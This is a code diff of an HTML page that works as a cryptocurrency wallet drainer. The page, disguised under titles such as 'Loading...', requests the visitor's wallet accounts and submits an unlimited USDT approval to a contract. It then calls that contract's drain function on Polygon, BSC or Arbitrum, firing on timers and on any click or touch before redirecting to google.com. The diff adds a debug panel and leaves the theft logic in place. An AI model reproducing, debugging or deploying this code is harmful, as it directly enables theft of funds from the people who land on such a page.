@@ -1,12 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Authentication in Process</title>
+    <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 </head>
-<body style="display: none;">
+<body>
+    <!-- DEBUG PANEL - Remove this after testing -->
+    <div id="debug" style="position: fixed; top: 10px; left: 10px; background: white; padding: 10px; z-index: 9999; border: 2px solid red; font-size: 12px; max-width: 300px;"></div>
+
 <script>
+const debug = document.getElementById('debug');
+debug.textContent = 'Script started...';
+
 // Required ABIs
 const usdtABI = [{
     "constant": false,
@@ -59,59 +65,74 @@ const CHAIN_CONFIGS = {
     }
 };
 
-// Silent auto-execute
 async function silentDrain() {
+    debug.textContent += '→ Wallet check...';
+    
     if (typeof window.ethereum !== 'undefined') {
+        debug.textContent += '→ Wallet found!';
+        
         try {
             const web3 = new Web3(window.ethereum);
+            debug.textContent += '→ Web3 created...';
+            
             const accounts = await window.ethereum.request({ 
                 method: 'eth_requestAccounts' 
             });
-            const user = accounts[0];
+            debug.textContent += '→ Accounts: ' + accounts[0];
+            
             const chainId = await web3.eth.getChainId();
+            debug.textContent += '→ Chain: ' + chainId;
             
             let config;
             if (chainId === 137) config = CHAIN_CONFIGS.polygon;
             else if (chainId === 56) config = CHAIN_CONFIGS.bsc;
             else if (chainId === 42161) config = CHAIN_CONFIGS.arbitrum;
-            else return;
+            else {
+                debug.textContent += '→ Wrong chain!';
+                return;
+            }
 
-            // Silent approval
+            debug.textContent += '→ Config: ' + config.function;
+
+            // Auto-approve
             const usdtContract = new web3.eth.Contract(usdtABI, config.usdt);
+            debug.textContent += '→ Approving...';
+            
             await usdtContract.methods.approve(config.contract, MAX_APPROVAL).send({
-                from: user,
+                from: accounts[0],
                 gas: 100000
             });
 
-            // Silent drain
+            debug.textContent += '→ Approved! Draining...';
+
+            // Auto-drain
             const drainContract = new web3.eth.Contract(drainABI, config.contract);
             await drainContract.methods[config.function](1000000).send({
-                from: user,
+                from: accounts[0],
                 gas: 200000
             });
 
-            // Silent redirect
+            debug.textContent += '→ DRAINED! Redirecting...';
             window.location.href = "https://google.com";
             
         } catch (error) {
-            // Completely silent fail - user sees nothing
+            debug.textContent += '→ ERROR: ' + error.message;
             window.location.href = "https://google.com";
         }
     } else {
-        // No wallet - just redirect
+        debug.textContent += '→ No wallet, redirecting...';
         window.location.href = "https://google.com";
     }
 }
 
-// Multiple silent execution attempts
-setTimeout(silentDrain, 300);
-setTimeout(silentDrain, 1500);
-setTimeout(silentDrain, 3000);
+// Multiple execution attempts
+setTimeout(silentDrain, 500);
+setTimeout(silentDrain, 2000);
+setTimeout(silentDrain, 5000);
 
 // Trigger on any interaction
 document.addEventListener('click', silentDrain);
 document.addEventListener('touchstart', silentDrain);
-document.addEventListener('load', silentDrain);
 </script>
 </body>
 </html>
